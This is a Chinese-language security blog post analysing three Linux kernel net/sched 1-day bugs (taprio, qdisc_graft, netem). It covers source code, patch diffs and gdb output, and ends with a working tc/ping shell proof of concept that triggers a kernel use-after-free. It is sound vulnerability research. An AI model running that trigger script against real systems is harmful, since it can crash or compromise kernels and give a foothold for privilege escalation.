---
layout: post
title:  "Three Linux net/sched 1-day Analysis"
categories: linux
---


## 1. (CVE-2024-36974) net/sched: taprio: always validate TCA_TAPRIO_ATTR_PRIOMAP

> Ref: https://ssd-disclosure.com/ssd-advisory-linux-kernel-taprio-oob/

更新 taprio qdisc 的請求會由 function `taprio_change()` 來處理。該 function 會先檢查使用者傳入的 `mqprio->num_tc` 是否合法 [1]，在從 `q->admin_sched != NULL` 判斷是否為第一次設置 [2]，如果不是就會回傳錯誤。若順利通過檢查，就會呼叫 `taprio_parse_mqprio_opt()` 設置 device tc queue number (`dev->num_tc`) [3]。最後，新分配的 admin object 會被 assign 給 `q->admin_sched` [4]，並把舊的 admin object 透過 RCU callback 釋放掉。

```c
static int taprio_change(struct Qdisc *sch, struct nlattr *opt,
             struct netlink_ext_ack *extack)
{
    // [...]
    if (tb[TCA_TAPRIO_ATTR_PRIOMAP])
        mqprio = nla_data(tb[TCA_TAPRIO_ATTR_PRIOMAP]);

    // [...]
    taprio_parse_mqprio_opt(dev, mqprio, extack, q->flags); // [1]
    
    // [...]
    new_admin = kzalloc(sizeof(*new_admin), GFP_KERNEL);
    
    // [...]
    admin = rtnl_dereference(q->admin_sched);
    
    if (mqprio && (oper || admin)) { // [2]
        err = -ENOTSUPP;
        goto free_sched;
    }

    if (mqprio) {
        err = netdev_set_num_tc(dev, mqprio->num_tc); // [3]
        for (i = 0; i < mqprio->num_tc; i++) {
            netdev_set_tc_queue(dev, i,
                        mqprio->count[i],
                        mqprio->offset[i]);
            q->cur_txq[i] = mqprio->offset[i];
        }
    }
    
    spin_lock_bh(qdisc_lock(sch));
    
    // [...]
    else {
        // [...]
        
        rcu_assign_pointer(q->admin_sched, new_admin); // [4]
        if (admin)
            call_rcu(&admin->rcu, taprio_free_sched_cb);
        
        // [...]
    }
    // [...]
}
```

`taprio_parse_mqprio_opt()` 檢查是否已經設置過 `dev->num_tc`，如果有的話就不會檢查 `qopt->num_tc` [5]，否則 `mqprio_validate_qopt()` 會確保 queue number 不超過上限，也就是 `qopt->num_tc <= TC_MAX_QUEUE` [6]。

```c
static int taprio_parse_mqprio_opt(struct net_device *dev,
                   struct tc_mqprio_qopt *qopt,
                   struct netlink_ext_ack *extack,
                   u32 taprio_flags)
{
    bool allow_overlapping_txqs = TXTIME_ASSIST_IS_ENABLED(taprio_flags);
    
    // [...]
    if (dev->num_tc) // [5]
        return 0;

    if (qopt->num_tc > dev->num_tx_queues) {
        return -EINVAL;
    }
    
    return mqprio_validate_qopt(dev, qopt, true, allow_overlapping_txqs, // [6]
                    extack);
}
```

漏洞成因有兩個關鍵點：

1. The update of `q->admin_sched` is RCU-protected and experiences some delay [4].
2. Ideally, only the first update is allowed due to the check `if(mqprio && (oper || admin))` [2].

因為第一點的關係，我們可以在 RCU grace period 內再次呼叫 `taprio_change()`，這樣就能夠繞掉第二點的檢查，**任意控制 `mqprio` 的內容**。

不過動態 debug 文章提供的 exploit 後，感覺起來**漏洞本身跟 RCU 沒有關係**。Exploit 一共執行了兩次 `taprio_change()`，第一次時建立的是 handle 為 0 [3] 的 qdisc object，我們先稱作 qdisc-0。

``` c
struct tcmsg tcmsg = {
    .tcm_family = 0,
    .tcm_ifindex = ifindex,
    .tcm_handle = 0, // [3]
    .tcm_parent = 0xffffffff,
    .tcm_info = 0,
};
```

而第二次時建立的是 handle 為 0x10000 [4] 的 qdisc object，稱作 qdisc-1。

``` c
struct tcmsg tcmsg2 = {
    .tcm_family = 0,
    .tcm_ifindex = ifindex,
    .tcm_handle = 0x10000, // [4]
    .tcm_parent = 0xffffffff,
    .tcm_info = 0,
};
```

由此可知，兩次傳入 `taprio_change()` 的參數 `sch` 會是不一樣的 qdisc object (qdisc-0, qdisc-1)，並且這 qdisc object 都使用同一個 network device object。第一次執行時，qdisc-0 的 `q->admin_sched` 會是 NULL，且 network device object 沒有初始化過，所以 `dev->num_tc` 會是 0。下方為 gdb output：

```
pwndbg> x/i $rip
=> 0xffffffff820aac60 <taprio_change>:  nop    DWORD PTR [rax+rax*1+0x0]

pwndbg> p sch
$6 = (struct Qdisc *) 0xffff888005af7000

pwndbg> hex sch->handle
+0000 0x80010000

pwndbg> p sch->dev_queue->dev
$7 = (struct net_device *) 0xffff888005b86000

pwndbg> p sch->dev_queue->dev->num_tc
$8 = 0
```

而在第二次執行時，qdisc-1 的 `q->admin_sched` 是 NULL，但是 `dev->num_tc` 已經在上次執行被初始化，所以會是 1。下面為 gdb output：

```
pwndbg> x/i $rip
=> 0xffffffff820aac60 <taprio_change>:  nop    DWORD PTR [rax+rax*1+0x0]

pwndbg> p sch
$9 = (struct Qdisc *) 0xffff888005af7400

pwndbg> hex sch->handle
+0000 0x010000

pwndbg> p sch->dev_queue->dev
$10 = (struct net_device *) 0xffff888005b86000

pwndbg> p sch->dev_queue->dev->num_tc
$11 = 1
```

在此情境下不需要考慮 RCU grace period 就可以觸發漏洞。

## 2. (CVE-2023-0590) net: sched: fix race condition in qdisc_graft()

> Commit: https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=ebda44da44f6f309d302522b049f43d6f829f7aa

想分析這個漏洞的原因在於：在存取 net/sched 時會上一個 big lock `rtnl_lock()`，並且 enqueue / dequeue 的操作也會在 root qdisc 上 lock，因此很少會出現 race condition 類型的漏洞，大部分的漏洞類型都是邏輯洞或 out-of-bounds access。

漏洞本身跟 net/sched 機制沒有關係，不用知道該段程式碼的 context 也能分析。下方為 diff 的程式碼片段：

```diff
-            notify_and_destroy(net, skb, n, classid,
-                       rtnl_dereference(dev->qdisc), new);
+            old = rtnl_dereference(dev->qdisc);
             if (new && !new->ops->attach)
                 qdisc_refcount_inc(new);
             rcu_assign_pointer(dev->qdisc, new ? : &noop_qdisc);
 
+            notify_and_destroy(net, skb, n, classid, old, new);
```

`notify_and_destroy(dev->qdisc)` 會依序呼叫下面 function：

- `qdisc_put(old_qdisc)`
- `__qdisc_destroy(old_qdisc)`
- `call_rcu(qdisc_free_cb)`
- `kfree(old_qdisc)`

根據 commit 的敘述，我們可以得知漏洞的成因發生在 RCU updater，因為 updater 沒有在 RCU grace period **開始前**更新成 new object，所以 old object 仍可以在其他地方被 reference 到。如果存取 old object 與 RCU callback 同時發生，就可能會有 UAF 的問題。

>The visible pointer (dev->qdisc in this case) must be updated to the new object _before_ RCU grace period is started (qdisc_put(old) in this case). 

如果看 Linux kernel 的 [RCU documentation](https://www.kernel.org/doc/Documentation/RCU/whatisRCU.txt) 範例程式碼，也能發現在呼叫 `call_rcu()` 之前 [1]，就需要呼叫 `rcu_assign_pointer()` 更新成 new object [2]。

```c
new_fp = kmalloc(sizeof(*new_fp), GFP_KERNEL);

spin_lock(&foo_mutex);
old_fp = rcu_dereference_protected(gbl_foo, lockdep_is_held(&foo_mutex));
*new_fp = *old_fp;
new_fp->a = new_a;
rcu_assign_pointer(gbl_foo, new_fp); // [1]
spin_unlock(&foo_mutex);

call_rcu(&old_fp->rcu, foo_reclaim); // [2]
```



## 3. sch/netem: fix use after free in netem_dequeue

> Commit: https://lore.kernel.org/all/20240901182438.4992-1-stephen@networkplumber.org

該漏洞與上一篇文章內的 netem 漏洞 (netem: fix return value if duplicate enqueue fails) 都是同個人回報，並且漏洞所提供的 primitive 一樣，只不過成因有些不同。下方為 diff：

```diff
@@ -742,11 +742,10 @@ static struct sk_buff *netem_dequeue(struct Qdisc *sch)
                 err = qdisc_enqueue(skb, q->qdisc, &to_free);
                 kfree_skb_list(to_free);
-                if (err != NET_XMIT_SUCCESS &&
-                    net_xmit_drop_count(err)) {
-                    qdisc_qstats_drop(sch);
-                    qdisc_tree_reduce_backlog(sch, 1,
-                                  pkt_len);
+                if (err != NET_XMIT_SUCCESS) {
+                    if (net_xmit_drop_count(err))
+                        qdisc_qstats_drop(sch);
+                    qdisc_tree_reduce_backlog(sch, 1, pkt_len);
```

Function `qdisc_tree_reduce_backlog()` 用來更新 qdisc 的 qlen，patch 前如果 `net_xmit_drop_count(err) == 0` 就不執行，而 patch 後只要 `if(err != NET_XMIT_SUCCESS)` 就會執行到。

如果沒有更新 qlen，就會導致 parent 與 child 的 qlen mismatch，最後會變成 class object UAF，具體做法可以參考 [Two Linux net/sched 1-day Analysis]({% post_url 2024-08-31-two-linux-net_sched-1-day-analysis %})。


### Create Filter with Action

當 enqueue 的回傳值為 `__NET_XMIT_STOLEN` 時，`net_xmit_drop_count()` 會回傳 0。

```c
#define net_xmit_drop_count(e)    ((e) & __NET_XMIT_STOLEN ? 0 : 1)
```

那怎麼做才能讓 netem 下一層的 qdisc object 其 enqueue handler 回傳 `__NET_XMIT_STOLEN` 呢？ 許多類型的 qdisc 在 classify 時都會設置回傳值包含 `__NET_XMIT_STOLEN`。以 drr 的 classify handler `drr_classify()` 為例，如果 `tcf_classify()` 的回傳結果為 `TC_ACT_STOLEN`，就會設置錯誤值包含 `__NET_XMIT_STOLEN` [1]。

```c
static struct drr_class *drr_classify(struct sk_buff *skb, struct Qdisc *sch,
                      int *qerr)
{
    // [...]
    result = tcf_classify(skb, NULL, fl, &res, false);
    if (result >= 0) {
        switch (result) {
        // [...]
        case TC_ACT_STOLEN:
            *qerr = NET_XMIT_SUCCESS | __NET_XMIT_STOLEN; // [1]
            fallthrough;
        case TC_ACT_SHOT:
            return NULL;
        }
        // [...]
    }
}
```

而 `tcf_classify()` 的回傳值會由 bind 在 filter object 的 action 決定，因此接下來要看怎麼在 filter 上新增 action object。

新增 filter 會由 function `tc_new_tfilter()` 處理，並在分配 protocol object 後 [2] 根據 filter 類型執行不同的初始化操作 [3]。

```c
static int tc_new_tfilter(/* ... */)
{
    // [...]
    tp_new = tcf_proto_create(name, protocol, prio, chain, // [2]
                      rtnl_held, extack);
    
    // [...]
    err = tp->ops->change(net, skb, tp, cl, t->tcm_handle, tca, &fh, // [3]
                  flags, extack);
    
    // [...]
}
```

以 **basic filter** 為例，change handler `basic_change()` 會先分配 filter object [4]，在執行 `basic_set_parms()` 初始化 [5]。

```c
static int basic_change(struct net *net, struct sk_buff *in_skb,
            struct tcf_proto *tp, unsigned long base, u32 handle,
            struct nlattr **tca, void **arg,
            u32 flags, struct netlink_ext_ack *extack)
{
    // [...]
    fnew = kzalloc(sizeof(*fnew), GFP_KERNEL); // [4]
    
    // [...]
    err = basic_set_parms(net, tp, fnew, base, tb, tca[TCA_RATE], flags,
                  extack); // [5]
    
    // [...]
}
```

`basic_set_parms()` 其中一個初始化，就是驗證並新增 filter 的 action。

```c
static int basic_set_parms(/* ... */)
{
    // [...]
    err = tcf_exts_validate(net, tp, tb, est, &f->exts, flags, extack);
    // [...]
}
```

`tcf_exts_validate()` 是 `tcf_exts_validate_ex()` wrapper function，而 `tcf_exts_validate_ex()` 在檢查到請求中有包含 action 的資訊時，就會呼叫 `tcf_action_init()` 來初始化 [6]。

```c
int tcf_exts_validate_ex(/* ... */)
{
    // [...]
    else if (exts->action && tb[exts->action]) {
        int err;

        flags |= TCA_ACT_FLAGS_BIND;
        err = tcf_action_init(net, tp, tb[exts->action], // [6]
                      rate_tlv, exts->actions, init_res,
                      &attr_size, flags, fl_flags,
                      extack);
        exts->nr_actions = err;
    }
    // [...]
}
```

`tcf_action_init()` 會找 action type 所對應到的 action ops (`struct tc_action_ops`) [7]，之後再呼叫 `tcf_action_init_1()` 做初始化 [8]。

```c
int tcf_action_init(/* ... */)
{
    // [...]
    a_o = tc_action_load_ops(tb[i], flags & TCA_ACT_FLAGS_POLICE, // [7]
                 !(flags & TCA_ACT_FLAGS_NO_RTNL),
                 extack);
    act = tcf_action_init_1(net, tp, tb[i], est, ops[i - 1], // [8]
                    &init_res[i - 1], flags, extack);
    // [...]
}
```

初始化的過程中會呼叫 action ops 的 init handler。

```c
struct tc_action *tcf_action_init_1(/* ... */)
{
    // [...]
    err = a_o->init(net, tb[TCA_ACT_OPTIONS], est, &a, tp,
                userflags.value | flags, extack);
    // [...]
}
```

如果 action type 是 **mirred**，會由 `act_mirred_ops.init` --- 也就是 `tcf_mirred_init()` 來處理。若要處理的 event action 是 egress + redirect，在解析完參數後會用 enum value `TCA_EGRESS_REDIR` 來表示 [9]。

接著 `tcf_idr_create_from_flags()` 會分配 action object [10]，並且呼叫 `tcf_action_set_ctrlact()` 設置 `a->tcfa_action` [11]。

```c
static int tcf_mirred_init(/* ... */)
{
    // [...]
    switch (parm->eaction) { // [9]
    // [...]
    case TCA_EGRESS_REDIR:
        break;
    }
    
    if (!exists) {
        // [...]
        ret = tcf_idr_create_from_flags(tn, index, est, a,
                        &act_mirred_ops, bind, flags); // [10]
    }
    
    m = to_mirred(*a);
    
    // [...]
    goto_ch = tcf_action_set_ctrlact(*a, parm->action, goto_ch); // [11]
    m->tcfm_eaction = parm->eaction;
    
    // [...]
}
```

### Traffic Classification

新增的 action 會在 filter classification 時被呼叫到。仍以 basic filter 為例，handler `basic_classify()` 會呼叫 `tcf_exts_exec()` [1] 執行 action。

```c
TC_INDIRECT_SCOPE int basic_classify(/* ... */)
{
    // [...]
    list_for_each_entry_rcu(f, &head->flist, link) {
        // [...]
        *res = f->res;
        r = tcf_exts_exec(skb, &f->exts, res); // [1]
        if (r < 0)
            continue;
        return r;
    }
    // [...]
}
```

`tcf_exts_exec()` 為 `tcf_action_exec()` 的 wrapper function，該 function 會遍歷 filter 上的所有 action 並執行 [2]，最後回傳執行結果 [3]。

```c
nt tcf_action_exec(struct sk_buff *skb, struct tc_action **actions,
            int nr_actions, struct tcf_result *res)
{
    // [...]
    
    for (i = 0; i < nr_actions; i++) {
        // [...]
        ret = tc_act(skb, a, res); // [2]
        
        // [...]
        if (ret != TC_ACT_PIPE)
            break;
    }
    
    return ret; // [3]
}
```

`tc_act()` 會呼叫 action ops 的 act handler (`a->ops->act()`)。先前建立的 mirred action 其 act handler 會是 `tcf_mirred_act()`，而該 function 會在呼叫 `tcf_mirred_to_dev()`。

```c
TC_INDIRECT_SCOPE int tcf_mirred_act(/* ... */)
{
    int retval = READ_ONCE(m->tcf_action);
    // [...]
    m_eaction = READ_ONCE(m->tcfm_eaction);
    retval = tcf_mirred_to_dev(skb, m, dev, m_mac_header_xmit, m_eaction,
                   retval);
    // [...]
}
```

因為之前新增的 action 是 egress + redirect，因此最後只會將 skb 轉送到 target device 並回傳參數 `retval`。

```c
static int tcf_mirred_to_dev(/* ... */, int retval)
{
    // [...]
    is_redirect = tcf_mirred_is_act_redirect(m_eaction);
    
    // [...]
    if (is_redirect) {
        
        // [...]
        err = tcf_mirred_forward(at_ingress, want_ingress, skb_to_send);
    }
    // [...]
    return retval;
}
```

`retval` 又是從使用者可控的資料 `m->tcf_action` 來的，因此只需要在初始化 mirred action (`tcf_mirred_init()`) 時 ，**設置 `a->tcfa_action` 的值 `TC_ACT_STOLEN`**，就能讓 `qdisc_enqueue()` 的回傳值滿足 `net_xmit_drop_count()` 的條件，導致 parent qdisc 與 child qdisc 的 qlen 不同步。

下方為 commit message 所提供的 PoC：

```bash
#!/bin/sh

ip link add type dummy
ip link set lo up
ip link set dummy0 up

tc qdisc add dev lo parent root handle 1: drr
tc filter add dev lo parent 1: basic classid 1:1
tc class add dev lo classid 1:1 drr

tc qdisc add dev lo parent 1:1 handle 2: netem
tc qdisc add dev lo parent 2: handle 3: drr
tc filter add dev lo parent 3: basic classid 3:1 action mirred egress redirect dev dummy0
tc class add dev lo classid 3:1 drr

ping -c1 -W0.01 localhost # Trigger bug

tc class del dev lo classid 1:1
tc class add dev lo classid 1:1 drr
ping -c1 -W0.01 localhost # UaF
```

P.S. 從 iproute2 tc 的 [source code](https://github.com/pantoniou/iproute2/blob/f443565f8df65e7d3b3e7cb5f4e94aec1e12d067/tc/m_mirred.c#L134) 能得知，預設 mirred 的 "redirect" action 就已經是 `TC_ACT_STOLEN`，因此不需要特別給。
